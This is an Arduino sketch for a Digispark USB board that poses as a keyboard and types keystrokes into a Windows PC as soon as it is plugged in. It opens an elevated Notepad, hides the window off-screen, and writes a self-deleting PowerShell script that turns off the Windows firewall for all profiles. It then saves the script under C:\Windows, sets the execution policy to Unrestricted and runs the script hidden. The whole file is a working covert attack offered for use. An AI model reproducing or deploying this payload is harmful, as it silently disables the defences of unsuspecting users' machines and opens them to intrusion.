#include "DigiKeyboard.h"

#define KEY_TAB 0x2B
#define KEY_DOWN_ARROW 0x51

void setup() {
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Start-Process notepad -Verb runAs");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.print("m");
  for (int i=0 ; i<100 ; i++){
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("netsh advfirewall set allprofiles state off");
  DigiKeyboard.println("Remove-Item $MyINvocation.InvocationName");
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
  DigiKeyboard.println("C:\\Windows\\config-46957.ps1");
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell.exe -windowstyle hidden -File C:\\Windows\\config-46957.ps1");
}

void loop() {
   DigiKeyboard.update();
}
